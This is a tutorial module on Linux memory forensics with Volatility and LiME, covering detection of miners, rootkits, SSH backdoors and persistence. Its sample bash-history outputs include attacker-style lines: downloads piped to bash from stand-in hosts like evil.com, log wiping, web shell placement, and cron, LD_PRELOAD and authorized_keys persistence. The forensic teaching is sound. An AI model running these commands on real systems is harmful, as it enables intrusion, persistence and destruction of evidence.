# Linux Memory Forensics with Volatility

## Why Linux Memory Forensics?

**Growing Linux attack surface:**
- **Cloud infrastructure**: 90% of cloud workloads run on Linux (AWS, Azure, GCP)
- **IoT and embedded devices**: Routers, cameras, smart devices (millions of Linux systems)
- **Servers and web hosting**: Apache, Nginx, databases (prime targets for APTs)
- **Container platforms**: Docker, Kubernetes (new attack vectors)

**Linux-specific threats:**
- Rootkits (kernel-level hiding)
- Cryptominers (resource hijacking)
- SSH backdoors (persistent access)
- Container escapes (privilege escalation)
- Web shells (PHP, Python, Perl backdoors)

## Linux Memory Acquisition

### LiME (Linux Memory Extractor)

**What is LiME?**
- Loadable kernel module that dumps physical RAM
- Works on ANY Linux kernel version (2.6.x to 6.x)
- Minimal memory footprint (doesn't pollute evidence)
- Supports live acquisition over network

**Installation:**
```bash
# Install kernel headers (required for compilation)
sudo apt-get install linux-headers-$(uname -r)  # Debian/Ubuntu
sudo yum install kernel-devel-$(uname -r)       # RHEL/CentOS

# Download LiME
git clone https://github.com/504ensicsLabs/LiME
cd LiME/src

# Compile for current kernel
make

# Result: lime-[kernel-version].ko (kernel module)
```

**Basic Acquisition:**
```bash
# Load module and dump to file
sudo insmod lime-*.ko "path=/tmp/memory.lime format=lime"

# Dump to network (forensic workstation)
# On forensic workstation (listening):
nc -l -p 4444 > memory.lime

# On target system:
sudo insmod lime-*.ko "path=tcp:192.168.1.100:4444 format=lime"
```

**Format Options:**
- `format=lime` - LiME format (recommended, includes metadata)
- `format=raw` - Raw memory dump (compatible with other tools)
- `format=padded` - Padded format (preserves physical addresses)

**Best Practices:**
```bash
# 1. Hash the dump immediately
sha256sum /tmp/memory.lime > /tmp/memory.lime.sha256

# 2. Compress to save space (544MB → ~200MB)
gzip /tmp/memory.lime

# 3. Transfer securely
scp /tmp/memory.lime.gz forensics@lab.local:/evidence/

# 4. Document system info
uname -a > system_info.txt
cat /proc/meminfo >> system_info.txt
lsmod >> system_info.txt
```

## Linux Volatility Plugins

### Category 1: Plugins That Work WITHOUT Symbols

These plugins work on ANY Linux dump by pattern scanning:

#### linux.bash.Bash
**Purpose**: Extract bash command history from memory

**Command:**
```bash
vol -f memory.lime linux.bash.Bash
```

**What it finds:**
- Commands typed in bash shells
- Commands from all users (root, regular users)
- Commands from closed terminals (still in memory)
- Commands from SSH sessions

**Example Output:**
```
PID     Process         CommandTime     Command
1234    bash           2024-01-18 14:30:00    wget http://evil.com/malware.sh
1234    bash           2024-01-18 14:30:15    chmod +x malware.sh
1234    bash           2024-01-18 14:30:20    ./malware.sh
5678    bash           2024-01-18 15:00:00    curl -s http://c2.evil.com | bash
5678    bash           2024-01-18 15:01:00    rm -rf /var/log/*
```

**Red Flags:**
- wget/curl downloading from suspicious domains
- chmod +x on files in /tmp or /dev/shm
- rm -rf on log files (anti-forensics)
- Base64 encoded commands (obfuscation)
- History manipulation: `history -c`, `unset HISTFILE`

#### linux.psaux.PsAux
**Purpose**: List all running processes (symbol-free)

**Command:**
```bash
vol -f memory.lime linux.psaux.PsAux
```

**Output Columns:**
- PID, UID, GID - Process and user identifiers
- Arguments - Full command line

**Example:**
```
PID     UID     GID     Arguments
1       0       0       /sbin/init
1234    1000    1000    /tmp/xmrig --url pool.minexmr.com:4444
5678    0       0       python3 /tmp/.hidden/backdoor.py
```

**Red Flags:**
- Processes in /tmp or /dev/shm (temporary locations)
- Hidden directories (names starting with .)
- Cryptocurrency miners (xmrig, cpuminer, minerd)
- Processes with no parent (PPID 1 but not system service)

#### banners.Banners
**Purpose**: Identify kernel version, distribution, system info

**Command:**
```bash
vol -f memory.lime banners.Banners
```

**Output:**
```
Offset          Banner
0x12345678      Linux version 5.4.0-42-generic (Ubuntu 20.04.1 LTS)
0x23456789      Ubuntu 20.04.1 LTS \n \l
0x34567890      Intel(R) Xeon(R) CPU E5-2670 v3 @ 2.30GHz
```

**Use Cases:**
1. Identify exact kernel version for symbol download
2. Determine Linux distribution (Ubuntu, CentOS, Debian)
3. Verify system specs match incident report

### Category 2: Plugins That NEED Symbols

These plugins require Linux kernel symbol files:

#### linux.pslist.PsList
**Purpose**: Fast process listing using kernel structures

**Command:**
```bash
vol -f memory.lime linux.pslist.PsList
```

**Advantages over psaux:**
- 10x faster (uses kernel task_struct linked list)
- Shows hidden processes (rootkit detection)
- Shows parent-child relationships (PPID)
- Shows process state (running, sleeping, zombie)

**Example Output:**
```
PID     PPID    COMM            State
1       0       systemd         RUNNING
1234    1       apache2         SLEEPING
5678    1       [kworker]       RUNNING (SUSPICIOUS - fake kernel thread)
```

#### linux.pstree.PsTree
**Purpose**: Show process hierarchy

**Command:**
```bash
vol -f memory.lime linux.pstree.PsTree
```

**Use Cases:**
- Identify parent-child relationships
- Find orphaned processes (malware)
- Trace process spawn chains (lateral movement)

**Example:**
```
systemd (1)
├── sshd (1000)
│   └── bash (1234)
│       └── wget (1235) - Downloads malware
│           └── malware.sh (1236) - Executes malware
└── cryptominer (5678) - Orphaned (should not be child of systemd)
```

#### linux.lsof.Lsof
**Purpose**: List open files and network connections

**Command:**
```bash
vol -f memory.lime linux.lsof.Lsof
```

**What it shows:**
- Open files (log files, executables, data files)
- Network connections (TCP/UDP sockets)
- Pipes and IPC mechanisms
- Deleted files still in memory (malware hides by deleting after execution)

**Red Flags:**
```
PID     FD      Type    Details
1234    3       REG     /tmp/malware (deleted) - Malware deleted itself but still running
5678    4       SOCK    192.168.1.100:443 -> 93.184.216.34:4444 - C2 connection
```

#### linux.malfind.Malfind
**Purpose**: Find code injection and shellcode

**Command:**
```bash
vol -f memory.lime linux.malfind.Malfind
```

**Detects:**
- Injected shared libraries (.so files)
- Anonymous memory regions (mmap without file backing)
- Executable stack (common in exploits)

## Linux-Specific Malware Detection

### Threat 1: Cryptocurrency Miners

**Common Miners:**
- XMRig (Monero mining)
- cpuminer / minerd (CPU mining)
- xmr-stak (Monero Stakd)

**Detection in Memory:**
```bash
# Find miner processes
vol -f memory.lime linux.psaux.PsAux | grep -i "xmrig\|miner\|cpuminer"

# Find bash commands downloading miners
vol -f memory.lime linux.bash.Bash | grep -i "xmrig\|mining\|pool"

# Example output:
# bash: wget hxxp://pool.minexmr.com/xmrig
# bash: ./xmrig --url pool.minexmr.com:4444 --user 47ABC...
```

**IOCs:**
- Process names: xmrig, minerd, cpuminer
- Command-line args: --url pool.minexmr.com, --donate-level
- Network connections to mining pools (port 3333, 4444, 5555)
- High CPU usage (99% sustained)

### Threat 2: SSH Backdoors

**Types:**
1. **Authorized Keys Backdoor**: Attacker adds public key to ~/.ssh/authorized_keys
2. **PAM Backdoor**: Modified /etc/pam.d files (universal password)
3. **SSH Daemon Backdoor**: Modified sshd binary (hardcoded password)

**Detection:**
```bash
# Find SSH sessions in memory
vol -f memory.lime linux.bash.Bash | grep ssh

# Look for suspicious SSH commands
# Example output:
# bash: echo "ssh-rsa AAAAB3NzaC1yc2E..." >> ~/.ssh/authorized_keys
# bash: chmod 600 ~/.ssh/authorized_keys
```

**Red Flags:**
- SSH sessions from unusual IPs (foreign countries)
- SSH logins to root account (should use sudo)
- Multiple failed SSH attempts followed by success (brute force)

### Threat 3: Rootkits

**What is a Linux rootkit?**
- Kernel module (.ko) that hides processes, files, network connections
- Modifies kernel functions (hooking)
- Survives reboots if installed in /etc/modules or initramfs

**Detection:**
```bash
# List loaded kernel modules
vol -f memory.lime linux.lsmod.Lsmod

# Check for hidden modules (loaded but not in lsmod output)
vol -f memory.lime linux.check_modules.Check_modules

# Find hooked system calls
vol -f memory.lime linux.check_syscall.Check_syscall
```

**Known Rootkit Families:**
- Diamorphine (process hiding, privilege escalation)
- Suterusu (network hiding, file hiding)
- Reptile (full-featured rootkit with C2)
- Vlany (userland rootkit with LD_PRELOAD)

**IOCs:**
- Kernel modules in /tmp or /dev/shm (not typical module locations)
- Modules with random names (abc123.ko)
- Modified system call table entries

### Threat 4: Container Escapes

**What is container escape?**
- Breaking out of Docker/LXC container to host system
- Exploiting kernel vulnerabilities (Dirty COW, CVE-2019-5736)
- Mounting host filesystem inside container

**Detection:**
```bash
# Find container processes
vol -f memory.lime linux.psaux.PsAux | grep -i "docker\|containerd\|runc"

# Check for suspicious mounts
vol -f memory.lime linux.mount.Mount

# Look for privilege escalation
vol -f memory.lime linux.bash.Bash | grep -i "docker\|nsenter\|unshare"
```

**Red Flags:**
- Container processes accessing host filesystem (/host/root)
- nsenter or unshare commands (namespace manipulation)
- Privileged containers (--privileged flag)

## Linux C2 Frameworks

### Metasploit on Linux

**Meterpreter Indicators:**
```bash
# Process: Often injected into legitimate process
# Network: Connection to attacker IP on port 4444 (default)
# Files: /tmp/.X11-unix/.X0-lock (hidden socket)
```

**Detection:**
```bash
vol -f memory.lime linux.bash.Bash | grep -i "meterpreter\|msf\|payload"
vol -f memory.lime linux.lsof.Lsof | grep "4444"
```

### Empire/Starkiller (PowerShell Empire)

**Linux Agent Indicators:**
```bash
# Process: python3 with obfuscated script
# Network: HTTPS to C2 (port 443)
# Persistence: Cron jobs or systemd services
```

### Sliver C2

**Modern C2 framework (Go-based):**
```bash
# Process: Hidden in /tmp or /var/tmp
# Network: mTLS encrypted C2 (hard to detect without process analysis)
# Beaconing: Regular check-ins every X seconds
```

**Detection:**
```bash
# Find Go-compiled binaries (Sliver is written in Go)
vol -f memory.lime linux.bash.Bash | grep -i "sliver\|beacon"

# Look for network beaconing
vol -f memory.lime linux.lsof.Lsof | grep "ESTABLISHED"
```

## Linux Persistence Mechanisms

### 1. Cron Jobs
**Purpose**: Schedule malware to run periodically

**Detection:**
```bash
# Cron files stored in memory
vol -f memory.lime linux.bash.Bash | grep crontab

# Example:
# bash: (crontab -l; echo "*/5 * * * * /tmp/miner") | crontab -
```

**Locations:**
- /etc/crontab (system-wide)
- /etc/cron.d/ (per-app cron)
- /var/spool/cron/crontabs/[user] (user crontabs)

### 2. Systemd Services
**Purpose**: Run malware as system service

**Detection:**
```bash
vol -f memory.lime linux.bash.Bash | grep systemctl

# Example:
# bash: systemctl enable malware.service
# bash: systemctl start malware.service
```

**Service file location:**
- /etc/systemd/system/ (user-created services)
- /lib/systemd/system/ (system services)

### 3. SSH Keys
**Purpose**: Persistent backdoor access

**Detection:**
```bash
vol -f memory.lime linux.bash.Bash | grep authorized_keys

# Example:
# bash: echo "ssh-rsa AAAAB3NzaC..." >> /root/.ssh/authorized_keys
```

### 4. LD_PRELOAD Rootkits
**Purpose**: Inject malicious library into all processes

**Detection:**
```bash
vol -f memory.lime linux.bash.Bash | grep LD_PRELOAD

# Example:
# bash: export LD_PRELOAD=/tmp/evil.so
# bash: echo 'export LD_PRELOAD=/tmp/evil.so' >> /etc/profile
```

## Practical Linux Forensics Workflow

### Scenario 1: Compromised Web Server

**Initial Triage:**
```bash
# 1. Get system info
vol -f webserver.lime banners.Banners

# 2. Find bash history
vol -f webserver.lime linux.bash.Bash > bash_history.txt

# 3. Look for web shell uploads
grep -i "wget\|curl\|upload" bash_history.txt

# 4. Find suspicious processes
vol -f webserver.lime linux.psaux.PsAux > processes.txt
grep -i "tmp\|dev/shm\|hidden" processes.txt
```

**Analysis:**
```bash
# Example findings:
# bash: wget http://attacker.com/webshell.php
# bash: mv webshell.php /var/www/html/uploads/
# bash: chmod 644 /var/www/html/uploads/webshell.php

# Next steps:
# - Identify web shell location
# - Check network connections from web server process
# - Review Apache/Nginx access logs
```

### Scenario 2: Cryptocurrency Miner Investigation

**Detection:**
```bash
# 1. Find high-CPU processes
vol -f server.lime linux.psaux.PsAux | grep -v "0.0"

# 2. Search for miner commands
vol -f server.lime linux.bash.Bash | grep -i "xmrig\|miner\|pool"

# Example output:
# bash: curl -s -L https://github.com/xmrig/xmrig/releases/download/v6.16.0/xmrig-6.16.0-linux-x64.tar.gz | tar xz
# bash: ./xmrig --url pool.supportxmr.com:443 --user 47ABC...
```

**Remediation:**
```bash
# 1. Identify miner process PID
# 2. Kill process: kill -9 <PID>
# 3. Find persistence (cron, systemd)
# 4. Remove miner files
# 5. Block mining pool domains at firewall
```

### Scenario 3: SSH Brute Force + Backdoor

**Analysis:**
```bash
# 1. Find SSH activity
vol -f server.lime linux.bash.Bash | grep ssh

# 2. Check for authorized_keys modifications
# bash: echo "ssh-rsa AAAAB3..." >> /root/.ssh/authorized_keys

# 3. Find SSH connections
vol -f server.lime linux.lsof.Lsof | grep ":22"

# Example:
# sshd: 192.168.1.100:22 -> 93.184.216.34:55123 ESTABLISHED
```

**IOCs:**
- Multiple SSH connections from same external IP
- Authorized keys added from bash commands
- SSH sessions running commands (wget, curl)

## Key Takeaways

1. **Use symbol-free plugins first**: linux.bash.Bash and linux.psaux.PsAux work without symbols
2. **Focus on bash history**: Reveals attacker commands and TTPs
3. **Check /tmp and /dev/shm**: Common malware hiding spots
4. **Cryptocurrency miners are common**: XMRig is most popular
5. **Rootkits hide in kernel modules**: Check loaded modules and syscall hooks
6. **Containers add complexity**: Docker escapes are a real threat

**Golden Rule**: ANY process in /tmp or /dev/shm is suspicious until proven otherwise.

## What's Next?

- **Module 07**: Mac memory forensics
- **Module 08**: Advanced kernel analysis
- **Module 09**: Timeline generation and correlation

---

**References**:
- "The Art of Memory Forensics" (Linux section) by Michael Hale Ligh et al.
- Volatility 3 Documentation: https://volatility3.readthedocs.io/
- LiME GitHub: https://github.com/504ensicsLabs/LiME
